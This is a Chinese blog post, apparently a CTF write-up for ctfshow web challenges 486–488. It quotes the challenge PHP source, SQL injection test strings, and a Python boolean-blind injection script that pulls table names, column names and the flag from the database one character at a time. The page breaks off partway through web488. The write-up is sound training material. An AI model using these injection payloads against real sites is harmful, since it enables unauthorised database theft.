	<button id="fabtn_open_sidebar" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" aria-label="Open Sidebar Menu" tooltip="菜单">
		<span class="btn-inner--icon"><i class="fa fa-bars"></i></span>
	</button>
	<button id="fabtn_reading_progress" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" aria-hidden="true" tooltip="阅读进度">
		<div id="fabtn_reading_progress_bar" style="width: 0%;"></div>
		<span id="fabtn_reading_progress_details">0%</span>
	</button>
</div>

<div id="content" class="site-content">


	<script src="https://cdn.jsdelivr.net/npm/@waline/client"></script>



	<script>
		var _hmt = _hmt || [];
		(function() {
		  var hm = document.createElement("script");
		  hm.src = "https://hm.baidu.com/hm.js?853baf6befa4784c85c2f47223a04efb" ;
		  var s = document.getElementsByTagName("script")[0]; 
		  s.parentNode.insertBefore(hm, s);
		})();
		</script>
		






<div class="page-information-card-container">
	
</div>

<div id="sidebar_mask"></div>
<aside id="leftbar" class="leftbar widget-area" role="complementary">
		
		<div id="leftbar_part1" class="widget widget_search card bg-white shadow-sm border-0">
			<div class="leftbar-banner card-body">
				<span class="leftbar-banner-title text-white">wanan</span>
				
				
			</div>
			
			
				<ul id='leftbar_part1_menu' class='leftbar-menu'>
					<li class='leftbar-menu-item'><a href='/'>首页</a></li><li class='leftbar-menu-item'><a href='/archives'>归档</a></li>
				</ul>
			
			<div class="card-body text-center leftbar-search-button">
				<button id="leftbar_search" class="btn btn-secondary btn-lg active btn-sm btn-block border-0" role="button" data-toggle="modal" data-target="#argon_search_modal" >
					<i class="menu-item-icon fa fa-search mr-0"></i> 搜索
				</button>
			</div>
		</div>
		<div id="leftbar_part2" class="widget widget_search card bg-white shadow-sm border-0">
			<div id="leftbar_part2_inner" class="card-body">
				
				<div class="nav-wrapper" style="padding-top: 5px;">
	                <ul class="nav nav-pills nav-fill" role="tablist">
						
							<li class="nav-item sidebar-tab-switcher">
								<a class="active show" id="leftbar_tab_catalog_btn" data-toggle="tab" href="#leftbar_tab_catalog" role="tab" aria-controls="leftbar_tab_catalog" no-pjax>文章目录</a>
							</li>
						
						<li class="nav-item sidebar-tab-switcher">
							<a class="" id="leftbar_tab_overview_btn" data-toggle="tab" href="#leftbar_tab_overview" role="tab" aria-controls="leftbar_tab_overview" no-pjax>站点概览</a>
						</li>
	                </ul>
				</div>
				<div>
					<div class="tab-content" style="padding: 10px 10px 0 10px;">
						
							<div class="tab-pane fade active show" id="leftbar_tab_catalog" role="tabpanel" aria-labelledby="leftbar_tab_catalog_btn">
								<div id="leftbar_catalog"></div>
								<script type="text/javascript">
									$(function () {
										$(document).headIndex({
											articleWrapSelector: '#post_content',
											indexBoxSelector: '#leftbar_catalog',
											subItemBoxClass: "index-subItem-box",
											itemClass: "index-item",
											linkClass: "index-link",
											offset: 80,
										});
									})
								</script>
								
							</div>
						
						<div class="tab-pane fade text-center" id="leftbar_tab_overview" role="tabpanel" aria-labelledby="leftbar_tab_overview_btn">
							<img id="leftbar_overview_author_image" src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092159138.jpeg" class="img-fluid rounded-circle shadow-sm" style="width: 100px;" alt="avatar">
							<h6 id="leftbar_overview_author_name">wanan</h6>
							<nav class="site-state">
								<div class="site-state-item site-state-posts">
									<a href="/archives">
										<span class="site-state-item-count">58</span>
										<span class="site-state-item-name">文章</span>
									</a>
								</div>
								<div class="site-state-item site-state-categories">
									<a data-toggle="modal" data-target="#blog_categories">
										<span class="site-state-item-count">7</span>
										<span class="site-state-item-name">分类</span>
									</a>
								</div>      
								<div class="site-state-item site-state-tags">
									<a data-toggle="modal" data-target="#blog_tags">
										<span class="site-state-item-count">7</span>
										<span class="site-state-item-name">标签</span>
									</a>
								</div>
							</nav>
							
									<div class="site-author-links">
										
									</div>
								
							
									<div class='site-friend-links'>
										<div class='site-friend-links-title'><i class='fa fa-fw fa-link'></i> Links</div>
										<ul class='site-friend-links-ul'>
											
												<li class='site-friend-links-item'>
													<a href='https://argon-docs.solstice23.top/#/' rel='noopener' target='_blank'>Argon</a>
												</li>
											
										</ul>
									</div>
								
						</div>
					</div>
				</div>
			</div>
		</div>
</aside>
<div class="modal fade" id="blog_categories" tabindex="-1" role="dialog" aria-labelledby="" aria-hidden="true">
	<div class="modal-dialog modal-dialog-centered">
		<div class="modal-content">
			<div class="modal-header">
				<h5 class="modal-title">分类</h5>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body">
				<a class="badge badge-secondary tag" href="/categories/BUUCTF/" rel="tag">BUUCTF <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/categories/Linux/" rel="tag">Linux <span class="tag-num">7</span></a><a class="badge badge-secondary tag" href="/categories/ctf/" rel="tag">ctf <span class="tag-num">26</span></a><a class="badge badge-secondary tag" href="/categories/ctfshow/" rel="tag">ctfshow <span class="tag-num">23</span></a><a class="badge badge-secondary tag" href="/categories/java%E7%9F%A5%E8%AF%86/" rel="tag">java知识 <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/categories/ctf/php%E7%9F%A5%E8%AF%86/" rel="tag">php知识 <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/categories/ctf/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入 <span class="tag-num">2</span></a>
			</div>
		</div>
	</div>
</div>
<div class="modal fade" id="blog_tags" tabindex="-1" role="dialog" aria-labelledby="" aria-hidden="true">
	<div class="modal-dialog modal-dialog-centered">
		<div class="modal-content">
			<div class="modal-header">
				<h5 class="modal-title">标签</h5>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body">
				<a class="badge badge-secondary tag" href="/tags/BUUCTF/" rel="tag">BUUCTF <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/Linux/" rel="tag">Linux <span class="tag-num">7</span></a><a class="badge badge-secondary tag" href="/tags/bugctf/" rel="tag">bugctf <span class="tag-num">2</span></a><a class="badge badge-secondary tag" href="/tags/ctf-show/" rel="tag">ctf.show <span class="tag-num">23</span></a><a class="badge badge-secondary tag" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入 <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/xctf/" rel="tag">xctf <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" rel="tag">攻防世界 <span class="tag-num">9</span></a>
			</div>
		</div>
	</div>
</div>


<div id="primary" class="content-area">
	<main id="main" class="site-main" role="main">
		
		
			
	<article class="post post-full card bg-white shadow-sm border-0 ">
	<header class="post-header text-center">
		
		<a class="post-title" href="/ctfshow/ctf.show/%E4%B8%AD%E6%9C%9F%E6%B5%8B%E8%AF%84/">中期测评</a>
		<div class="post-meta">
			
						
						<div class="post-meta-detail post-meta-detail-time">
							<i class="fa fa-clock-o" aria-hidden="true"></i>
							<time title="发布于 2022-4-17 22:37:17 | 编辑于 2022-4-18 15:29:19">2022-4-17 22:37
							</time>
						</div>
					
						
							<div class="post-meta-devide">|</div>
						
						<div class="post-meta-detail post-meta-detail-categories">
							<i class="fa fa-bookmark-o" aria-hidden="true"></i>
							<a class="post-meta-detail-catagory-link" href="/categories/ctfshow/">ctfshow</a>
						</div>
					
						
							<div class="post-meta-devide">|</div>
						
						<div class="post-meta-detail post-meta-detail-words">
							<i class="fa fa fa-book" aria-hidden="true"></i>
							<span id="busuanzi_container_page_pv">
								阅读<span id="busuanzi_value_page_pv"></span>次
							</span>
						</div>
					
						
							<div class="post-meta-devide">|</div>
						
						<div class="post-meta-detail post-meta-detail-words">
							<i class="fa fa-file-word-o" aria-hidden="true"></i>
							17.4k 字
						</div>
					
						
							<div class="post-meta-devide">|</div>
						
						<div class="post-meta-detail post-meta-detail-readingtime">
							<i class="fa fa-hourglass-end" aria-hidden="true"></i>
							101 分钟
						</div>
					
		</div>
		
	</header>

	<div class="post-content" id="post_content">
		<h1 id="web486"><a href="#web486" class="headerlink" title="web486"></a>web486</h1><p>打开是一个登录</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410191856556.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220410191856556"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410191923770.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220410191923770"></p>

<p>翻一下源码,没发现什么</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410191952963.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220410191952963"></p>

<p>注册之后登录也没有反应,重点并不是在这里</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410192022882.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220410192022882"></p>

<p>发现地址有一个login,感觉像是文件包含</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410192056235.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220410192056235"></p>

<p>尝试包含index.php发现出错,并且看到有一个templates目录, 还有render我们回到html试试</p>
<p>index.php</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410192221515.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220410192221515"></p>

<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 15:43:51
 Last Modified by:   h1xa
 Last Modified time: 2021-03-08 18:11:51
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

ini_set(&#39;display_errors&#39;, &#39;On&#39;);
include(&#39;render/render_class.php&#39;);



$action=$_GET[&#39;action&#39;];
if(!isset($action))&#123;
    header(&#39;location:index.php?action=login&#39;);
&#125;else&#123;
    templateUtil::render($action);
&#125;
</code></pre>
<p>这里并没有有用的.我们去查看render_class文件</p>
<p>render&#x2F;render_class.php</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410192329514.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220410192329514"></p>

<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 17:52:18
 Last Modified by:   h1xa
 Last Modified time: 2021-03-08 18:10:19
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

include(&#39;file_class.php&#39;);

class templateUtil &#123;
    public static function render($template,$arg=array())&#123;
        $templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.php&#39;);
        return templateUtil::shade($templateContent,$arg);
    &#125;
    public static  function shade($templateContent,$arg)&#123;
        foreach ($arg as $key =&gt; $value) &#123;
            $templateContent=str_replace(&#39;&#123;&#123;'.$key.'&#125;&#125;&#39;, $value, $templateContent);
        &#125;
        echo $templateContent;
        
    &#125;
&#125;
</code></pre>
<p>render&#x2F;file_class文件</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410192407141.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220410192407141"></p>

<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 17:56:41
 Last Modified by:   h1xa
 Last Modified time: 2021-03-08 17:56:42
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


class fileUtil&#123;

    public static function read($filename)&#123;
        return file_get_contents($filename);
    &#125;

    public static function write($filename,$content,$append =0)&#123;
        if($append)&#123;
            file_put_contents($filename, $content,FILE_APPEND);
        &#125;else&#123;
            file_put_contents($filename, $content);
        &#125;
    &#125;
&#125;
</code></pre>
<p>没什么思路,我们试一下包含flag文件</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410204859844.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220410204859844"></p>

<h1 id="web487"><a href="#web487" class="headerlink" title="web487"></a>web487</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410205121149.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220410205121149"></p>

<p>一样的页面,但是这次,我们搜到了一个cheak文件这次我们在试一下文件包含</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410205138507.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220410205138507"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410205240261.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220410205240261"></p>

<p>index.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 15:43:51
 Last Modified by:   h1xa
 Last Modified time: 2021-03-08 22:30:08
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

include(&#39;render/render_class.php&#39;);
include(&#39;render/db_class.php&#39;);



$action=$_GET[&#39;action&#39;];
if(!isset($action))&#123;
    header(&#39;location:index.php?action=login&#39;);
    die();    
&#125;

if($action==&#39;check&#39;)&#123;
    $username=$_GET[&#39;username&#39;];
    $password=$_GET[&#39;password&#39;];
    $sql = &quot;select id from user where username = md5(&#39;$username&#39;) and password=md5(&#39;$password&#39;) order by id limit 1&quot;;#这里明显的sql注入
    $user=db::select_one($sql);
    if($user)&#123;
        templateUtil::render(&#39;index&#39;,array(&#39;username&#39;=&gt;$username));
    &#125;else&#123;
        header(&#39;location:index.php?action=login&#39;);
    &#125;
&#125;

if($action==&#39;login&#39;)&#123;
    templateUtil::render($action);
&#125;else&#123;
    templateUtil::render($action);
&#125;
</code></pre>
<p>&#x2F;render&#x2F;render_class.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 17:52:18
 Last Modified by:   h1xa
 Last Modified time: 2021-03-08 22:15:24
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

ini_set(&#39;display_errors&#39;, &#39;On&#39;);
include(&#39;file_class.php&#39;);
include(&#39;cache_class.php&#39;);

class templateUtil &#123;
    public static function render($template,$arg=array())&#123;
        if(cache::cache_exists($template))&#123;
            echo cache::get_cache($template);
        &#125;else&#123;
            $templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.php&#39;);
            $cache=templateUtil::shade($templateContent,$arg);
            cache::create_cache($template,$cache);
            echo $cache;
        &#125;
    &#125;
    public static  function shade($templateContent,$arg)&#123;
        foreach ($arg as $key =&gt; $value) &#123;
            $templateContent=str_replace(&#39;&#123;&#123;'.$key.'&#125;&#125;&#39;, $value, $templateContent);
        &#125;
        return $templateContent;
    &#125;

&#125;
</code></pre>
<p>&#x2F;render&#x2F;db_class.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 20:43:40
 Last Modified by:   h1xa
 Last Modified time: 2021-03-08 22:29:27
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/
ini_set(&#39;display_errors&#39;, &#39;On&#39;);

class db&#123;
    

    public static  function getConnection()&#123;
         $username=&#39;root&#39;;
         $password=&#39;root&#39;;
         $port=&#39;3306&#39;;
         $addr=&#39;127.0.0.1&#39;;
         $database=&#39;ctfshow&#39;;
        return new mysqli($addr,$username,$password,$database);
    &#125;

    public static function select_one($sql)&#123;
        $conn = db::getConnection();
        $result=$conn-&gt;query($sql);
        if($result)&#123;
            return $result-&gt;fetch_object();
        &#125;

    &#125;
&#125;
</code></pre>
<p>&#x2F;render&#x2F;cache_class</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 20:49:18
 Last Modified by:   h1xa
 Last Modified time: 2021-03-08 21:40:10
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/
ini_set(&#39;display_errors&#39;, &#39;On&#39;);

class cache&#123;
    public static function create_cache($template,$content)&#123;
        if(file_exists(&#39;cache/&#39;.md5($template).&#39;.php&#39;))&#123;
            return true;
        &#125;else&#123;
            fileUtil::write(&#39;cache/&#39;.md5($template).&#39;.php&#39;,$content);
        &#125;
    &#125;
    public static function get_cache($template)&#123;
        return fileUtil::read(&#39;cache/&#39;.md5($template).&#39;.php&#39;);
    &#125;
    public static function cache_exists($template)&#123;
        return file_exists(&#39;cache/&#39;.md5($template).&#39;.php&#39;);
    &#125;

&#125;
</code></pre>
<p>&#x2F;render&#x2F;file_class.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 17:56:41
 Last Modified by:   h1xa
 Last Modified time: 2021-03-08 21:23:28
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

ini_set(&#39;display_errors&#39;, &#39;On&#39;);
class fileUtil&#123;

    public static function read($filename)&#123;
        return file_get_contents($filename);
    &#125;

    public static function write($filename,$content,$append =0)&#123;
        if($append)&#123;
            file_put_contents($filename, $content,FILE_APPEND);
        &#125;else&#123;
            file_put_contents($filename, $content);
        &#125;
    &#125;
&#125;
</code></pre>
<p>看了看其他的也没有可以利用的点,只有sql注入</p>
<pre><code>select id from user where username = md5(&#39;$username&#39;) and password=md5(&#39;1&#39;) or 1=2#&#39;) order by id limit 1
</code></pre>
<pre><code>?action=check&amp;username=1&#39;) or 0 -- + # %23&amp;password=1
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410221106580.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220410221106580"></p>

<pre><code>?action=check&amp;username=1&#39;) or 1 -- + # %23&amp;password=1
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410221119368.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220410221119368"></p>

<p>判断</p>
<pre><code class="php">import requests
url = &quot;http://c2367eca-9985-48ba-b0f2-b554dad1a2a2.challenge.ctf.show/index.php&quot;
payload = &quot;length(database())=0&quot; #错误
payload = &quot;length(database())&gt;0&quot; #正确    返回admin
params = &#123;
            &#39;username&#39;: f&quot;1&#39;) or if(&#123;payload&#125;,1,0)#&quot;,
            &#39;password&#39;: &#39;1&#39;,
            &#39;action&#39; : &#39;check&#39;
        &#125;
r = requests.get(url,params=params)
print(r.text)
</code></pre>
<pre><code class="php">import requests

url = &quot;http://c2367eca-9985-48ba-b0f2-b554dad1a2a2.challenge.ctf.show/index.php&quot;

result = &quot;&quot;
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head &lt; tail:
        mid = (head + tail) &gt;&gt; 1
        # 查数据库 flag
        #payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;
        # 查字段 flag
        #payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;&quot;
        # 查flag
        payload = &quot;select group_concat(flag) from flag&quot;
        params = &#123;
            &#39;username&#39;: f&quot;1&#39;) or if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)#&quot;,
            &#39;password&#39;: &#39;1&#39;,
            &#39;action&#39; : &#39;check&#39;
        &#125;

        r = requests.get(url,params=params)
        #print(r.text)
        if &quot;admin&quot;  in r.text:
            head = mid + 1
        else:
            tail = mid

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
</code></pre>
<h1 id="web488"><a href="#web488" class="headerlink" title="web488"></a>web488</h1><p>index.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 15:43:51
 Last Modified by:   h1xa
 Last Modified time: 2021-03-09 11:59:28
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

include(&#39;render/render_class.php&#39;);
include(&#39;render/db_class.php&#39;);



$action=$_GET[&#39;action&#39;];
if(!isset($action))&#123;
    header(&#39;location:index.php?action=login&#39;);
    die();    
&#125;

if($action==&#39;check&#39;)&#123;
    $username=$_GET[&#39;username&#39;];
    $password=$_GET[&#39;password&#39;];
    $sql = &quot;select id from user where username = &#39;&quot;.md5($username).&quot;&#39; and password=&#39;&quot;.md5($password).&quot;&#39; order by id limit 1&quot;;#这次的sql不可用了
    $user=db::select_one($sql);
    if($user)&#123;
        templateUtil::render(&#39;index&#39;,array(&#39;username&#39;=&gt;$username));
    &#125;else&#123;
        templateUtil::render(&#39;error&#39;,array(&#39;username&#39;=&gt;$username));
    &#125;
&#125;

if($action==&#39;login&#39;)&#123;
    templateUtil::render($action);
&#125;else&#123;
    templateUtil::render($action);
&#125;
</code></pre>
<p>&#x2F;render&#x2F;render_class.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 17:52:18
